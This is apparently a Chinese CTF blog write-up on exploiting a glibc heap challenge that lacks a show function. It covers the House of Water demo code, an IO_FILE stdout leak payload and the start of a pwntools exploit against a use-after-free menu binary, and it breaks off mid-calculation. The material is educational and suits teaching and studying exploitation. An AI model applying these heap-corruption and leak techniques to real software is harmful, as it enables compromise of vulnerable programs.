@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="img/cover.jpg">
+    <meta property="twitter:image" content="img/cover.jpg" />
+    
+
+    
+    <meta name="title" content="无show函数前提下的heap exploit" />
+    <meta property="og:title" content="无show函数前提下的heap exploit" />
+    <meta property="twitter:title" content="无show函数前提下的heap exploit" />
+    
+
+    
+    <meta name="description" content="glibc中堆题，在没有show函数下，利用house of water和IO_FILE组合攻击">
+    <meta property="og:description" content="glibc中堆题，在没有show函数下，利用house of water和IO_FILE组合攻击" />
+    <meta property="twitter:description" content="glibc中堆题，在没有show函数下，利用house of water和IO_FILE组合攻击" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, Zephyr, Zephyr, , Zephyr的网络日志, Zephyr的博客, Zephyr Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>无show函数前提下的heap exploit | Zephyr的博客 | Zephyr Blog | Zephyr#3 | #3 |</title>
+
+    <link rel="canonical" href="/houseofwater/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ["$", "$"],
+          ["\\(", "\\)"],
+        ],
+        displayMath: [
+          ["$$", "$$"],
+          ["\\[", "\\]"],
+        ],
+        processEscapes: true,
+        processEnvironments: true,
+      },
+      options: {
+        skipHtmlTags: ["script", "noscript", "style", "textarea", "pre"],
+      },
+    };
+  
+    window.addEventListener("load", (event) => {
+      document.querySelectorAll("mjx-container").forEach(function (x) {
+        x.parentElement.classList += "has-jax";
+      });
+    });
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script
+    type="text/javascript"
+    id="MathJax-script"
+    async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
+  ></script>
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/life//">LIFE</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/cover.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ctf" title="CTF">
+                            CTF
+                        </a>
+                        
+                        <a class="tag" href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                    </div>
+                    <h1>无show函数前提下的heap exploit</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Zephyr
+                             
+                            on 
+                            Wednesday, September 25, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <blockquote>
+<p>我们在10月10日-10月17日日举办了面向校内的CTF欢乐赛，学长出了一道pwn压轴，其中是一个经典菜单题，但是没有show函数，本文通过利用house of water和IO_FILE攻击来实现解题。</p>
+</blockquote>
+<h1 id="无show堆题-house-of-water">无show堆题 House Of Water</h1>
+<h1 id="攻击步骤">攻击步骤</h1>
+<p>在 <code>how2heap</code> 中的演示代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>#include&lt;<span style="color:#ff79c6">stdio.h</span>&gt;
+</span></span><span style="display:flex;"><span>#include&lt;<span style="color:#ff79c6">stdlib.h</span>&gt;
+</span></span><span style="display:flex;"><span>#include&lt;<span style="color:#ff79c6">assert.h</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">int</span> main(){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>_ <span style="color:#ff79c6">=</span> NULL;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    setbuf(stdin,NULL);
+</span></span><span style="display:flex;"><span>    setbuf(stdout,NULL);
+</span></span><span style="display:flex;"><span>    setbuf(stderr,NULL);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>fake_size_lsb <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x3d8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>fake_size_msb <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x3e8</span>);
+</span></span><span style="display:flex;"><span>    free(fake_size_lsb);
+</span></span><span style="display:flex;"><span>    free(fake_size_msb);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>metadata <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>)((<span style="color:#ff79c6">long</span>) (fake_size_lsb <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">-</span>(<span style="color:#bd93f9">0xfff</span>)));
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>x[<span style="color:#bd93f9">7</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span>(<span style="color:#ff79c6">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span> ; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">7</span> ; i <span style="color:#ff79c6">++</span>){
+</span></span><span style="display:flex;"><span>        x[i] <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x88</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>unsorted_start <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x88</span>);
+</span></span><span style="display:flex;"><span>    _ <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>unsorted_middle <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x88</span>);
+</span></span><span style="display:flex;"><span>    _ <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>unsorted_end <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x88</span>);
+</span></span><span style="display:flex;"><span>    _ <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    _ <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0xf000</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>end_of_fake <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)end_of_fake <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x10000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)(end_of_fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x20</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span>(<span style="color:#ff79c6">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span> ; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">7</span> ; i <span style="color:#ff79c6">++</span>){
+</span></span><span style="display:flex;"><span>        free(x[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)(unsorted_start <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x18</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x31</span>;
+</span></span><span style="display:flex;"><span>    free(unsorted_start <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)(unsorted_start <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x8</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x91</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)(unsorted_end <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x18</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x21</span>;
+</span></span><span style="display:flex;"><span>    free(unsorted_end <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)(unsorted_start <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x8</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x91</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    free(unsorted_end);
+</span></span><span style="display:flex;"><span>    free(unsorted_middle);
+</span></span><span style="display:flex;"><span>    free(unsorted_start);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(unsigned <span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)unsorted_start <span style="color:#ff79c6">=</span> (unsigned <span style="color:#ff79c6">long</span>)(metadata<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x80</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(unsigned <span style="color:#ff79c6">long</span> <span style="color:#ff79c6">*</span>)(unsorted_end<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>) <span style="color:#ff79c6">=</span> (unsigned <span style="color:#ff79c6">long</span>)(metadata<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x80</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//now this can be the fake chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>meta_chunk <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x288</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    assert(meta_chunk <span style="color:#ff79c6">==</span> (metadata<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x90</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>
+  <img src="image.png" alt="image.png">
+
+</p>
+<p>主要是攻击 <code>tcache_perthread_struct</code>  在里面伪造一个 size为 0x10001的fake_chunk,然后将他放到 <code>unsortedbin</code> 中申请出来，可以控制tcache</p>
+<ol>
+<li>释放的 0x3e0 和 0x3f0 两个堆块是为了构造一个 0x10001 这样的大小块，这是因为 tcache_perthread_struct 第一个值会标记每个 tcachebin 内的堆块数量，这样就构造出了一个 size 样式的东西，方便我们进行 fake chunk 的创建。</li>
+<li>19-22 行：创建 7 个 chunk，很明显是为了填满 tcachebin</li>
+<li>24-33 行：间隔创建三个 chunk，并且增加间隔防止合并，这三个 chunk 全部在 unsortedbin 的位置。然后创建了一个巨大的 0xf000 的 chunk，用来填充到 0x10001，目的是为了让最开始讲的 tcache_perthread_struct 那个 0x10001 作为 size 是合法的。</li>
+<li>35-37 行：创建 0x20 大小的 chunk，并且伪造 prev_size 和下一个 chunk 的 size：0x20；</li>
+<li>39-41 行：填满 tcachebin</li>
+<li>43-45 行：在 unsorted_start 的上面设置了一个 0x31 的堆块并且释放，释放掉之后由于进入 tcachebin 会加入一个验证的 key，这个 key 会覆盖掉原本 unsorted_start 的 size，所以得还原。</li>
+<li>47-49 行：同理</li>
+<li>在刚刚两个步骤下，我们可以知道在 tcache_perthread_struct 中，0x20 大小的会在 tcachebin 的第一个位置，而 0x30 大小的会在 tcachebin 的第二个位置，于是就造成了 0x10001 这个值下面刚好是这么两个地址，这样的话，也就是说假设 0x10001 进入 bin，那么它的 fd 指针将指向 unsorted_end，而 bk 指针将指向 unsorted_start</li>
+<li>51-53 行：释放了三个 chunk，他们仨会进 unsorted bin，这里 unsorted bin 里会变成：<code>unsorted_start-&gt;unsorted_middle-&gt;unsorted_end</code></li>
+<li>55-56 行：这一步是将之前讲到的 0x10001 这个堆块链接上去，替换掉 unsorted_middle。，可以看到将 unsorted_start 的 fd 指针变成了 fake_chunk，unsorted_end 的 bk 指针也变成了 fake_chunk，而刚刚提到了，fake_chunk 的 fd 指针是 unsorted_end，bk 指针是 unsorted_start，和 unsorted_middle 是一样的，所以完全可以过 unsorted bin 检测。在这一步之后，unsorted bin 变成了 <code>unsorted_start-&gt;fake_chunk_unsorted_end</code>。很明显，如果这时候我们对 fake_chunk 里面踩一个 libc 地址，它会默认跑到 tcachebin 中去。</li>
+<li>59 行：这一步的想法是进行切割，如果 unsorted bin 里面没有合适大小的块，则它会按顺序分配到 smallbin 或者 largebin 中，然后再进行切割，很明显这里会把 unsorted_start 和 unsorted_end 放入 small bin，而 fake chunk 进入 large bin。所以只要选择一个小于 0x10000 的块，这样在放入各自的 bin 之后，由于只有 fake chunk 进入了 large bin，它一定会在某两个位置出现 libc 地址，而这两个位置会变成 tcache bin 的两个。在此之后，如果申请相应大小的 tcache bin 的 chunk，则会在 libc 上建立相应的堆块。</li>
+</ol>
+<p>house of water后可以在 <code>tcache_perthread_struct</code> 中放一个libc地址，没有show函数的情况下要打 io_file</p>
+<p>其中 <code>_IO_2_1_stdout_</code> 的 <code>_flags</code> 是这样的：<code>_IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF</code></p>
+<p>我们在使用的时候，可以将 <code>_flags</code>调成 <code>0xfbda18**</code>，从上面可以找到含义，然后将 <code>_IO_write_base</code> 改成想要泄露的位置，再将 <code>_IO_write_ptr</code> 改为结束位置，就可以在下一次调用 puts 或者 printf 的时候泄露出来想要的东西了。</p>
+<p>一般如果想要泄露 libc 的话 payload 会写 <code>p64(0xfbad1800)+p64(0x0)*3+'\x00'</code></p>
+<p>这个也可以用 fastbin attack 来做，因为 stdout 的上面是 stderr，里面会有 <code>0x7f</code>。</p>
+<p><a href="https://www.notion.so/IO_FILe-6e8fee09d7c34dd79425f0936894ed9a?pvs=21">IO_FILe</a></p>
+<p>将flag设置为 <code>0xfbad1800</code> ，目的是让他冲掉缓冲区，将内容输出出来</p>
+<p>然后 read_ptr,read_end,read_base这三项随意，设置为0，同时修改好 <code>write_base</code> <code>write_ptr</code> 和 <code>write_end</code></p>
+<p>然后他会输出从 <code>write_base</code> 到 <code>write_ptr</code> 中的内容。</p>
+<h1 id="题目分析">题目分析</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">int</span> __cdecl main(<span style="color:#ff79c6">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">char</span> <span style="color:#ff79c6">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">int</span> v3; <span style="color:#6272a4">// ebx
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">int</span> v5; <span style="color:#6272a4">// [rsp+8h] [rbp-28h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  unsigned <span style="color:#ff79c6">int</span> v6; <span style="color:#6272a4">// [rsp+Ch] [rbp-24h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  unsigned <span style="color:#ff79c6">int</span> v7; <span style="color:#6272a4">// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">int</span> nbytes[<span style="color:#bd93f9">7</span>]; <span style="color:#6272a4">// [rsp+14h] [rbp-1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>nbytes[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28</span>u);
+</span></span><span style="display:flex;"><span>  init(argc, argv, envp);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> ( <span style="color:#bd93f9">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    menu();
+</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v5);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">switch</span> ( v5 )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#f1fa8c">&#34;idx: &#34;</span>);                        <span style="color:#6272a4">// add
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v6);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v6 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x20</span> )
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_10;
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#f1fa8c">&#34;size: &#34;</span>);
+</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v7);
+</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> v6;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>array <span style="color:#ff79c6">+</span> v3) <span style="color:#ff79c6">=</span> malloc((<span style="color:#ff79c6">int</span>)v7);
+</span></span><span style="display:flex;"><span>        size[v6] <span style="color:#ff79c6">=</span> v7;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#f1fa8c">&#34;idx: &#34;</span>);
+</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v7);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x20</span> )
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_10;
+</span></span><span style="display:flex;"><span>        free(<span style="color:#ff79c6">*</span>((<span style="color:#ff79c6">void</span> <span style="color:#ff79c6">**</span>)<span style="color:#ff79c6">&amp;</span>array <span style="color:#ff79c6">+</span> (<span style="color:#ff79c6">int</span>)v7));
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">3</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#f1fa8c">&#34;idx: &#34;</span>);
+</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v7);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x20</span> )
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">goto</span> LABEL_10;
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#f1fa8c">&#34;Show is forbidden!&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">4</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#f1fa8c">&#34;idx: &#34;</span>);
+</span></span><span style="display:flex;"><span>        __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v6);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v6 <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x20</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          printf(<span style="color:#f1fa8c">&#34;offset: &#34;</span>);
+</span></span><span style="display:flex;"><span>          __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v7);
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> ( size[v6] <span style="color:#ff79c6">&gt;=</span> (signed <span style="color:#ff79c6">int</span>)v7 <span style="color:#ff79c6">&amp;&amp;</span> (v7 <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x80000000</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            nbytes[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> size[v6] <span style="color:#ff79c6">-</span> v7;
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#f1fa8c">&#34;content: &#34;</span>);
+</span></span><span style="display:flex;"><span>            read(<span style="color:#bd93f9">0</span>, (<span style="color:#ff79c6">void</span> <span style="color:#ff79c6">*</span>)(<span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>array <span style="color:#ff79c6">+</span> (<span style="color:#ff79c6">int</span>)v6) <span style="color:#ff79c6">+</span> (<span style="color:#ff79c6">int</span>)v7), (unsigned <span style="color:#ff79c6">int</span>)nbytes[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            puts(<span style="color:#f1fa8c">&#34;offset error&#34;</span>);
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>LABEL_10<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>          puts(<span style="color:#f1fa8c">&#34;idx error&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#bd93f9">5</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>show函数被禁用，只有uaf</p>
+<p>思路就是先用house of water控制tcache，然后打iofile_leak 拿到libc地址，然后再用house of apple打</p>
+<p><code>p = process(&quot;./pwn&quot; , aslr = False)</code> 关aslr便于调试</p>
+<p>首先添加堆块0x3e8,0xf8之后依次释放，在tcache_perthread_struct上面伪造一个size 0x10001</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x3d8</span>)
+</span></span><span style="display:flex;"><span>    add(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x3e8</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    dele(<span style="color:#bd93f9">1</span>)
+</span></span></code></pre></div><p>然后查看 tcache_perthread_struct</p>
+<p>
+  <img src="image%201.png" alt="image.png">
+
+</p>
+<p>然后我们计划填满0x90的tcache链，这样再申请最终大小为0x90堆块并释放后就会进入unsortedbin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> range(<span style="color:#bd93f9">7</span>)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        add(<span style="color:#bd93f9">0x1f</span><span style="color:#ff79c6">-</span>i, <span style="color:#bd93f9">0x88</span>)
+</span></span></code></pre></div><p>由于house of water需要在 <code>unsortedbin_start</code>的那个堆块上面伪造一个0x31大小的堆块，在 <code>unsortedbin_end</code> 上面伪造一个 0x21大小的堆块，为了能释放这两个，我们需要提前埋好指针，利用uaf来拿到对应的索引。</p>
+<p>我们可以计算一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>unsorted_bin start<span style="color:#ff79c6">:</span> <span style="color:#bd93f9">0x90</span>
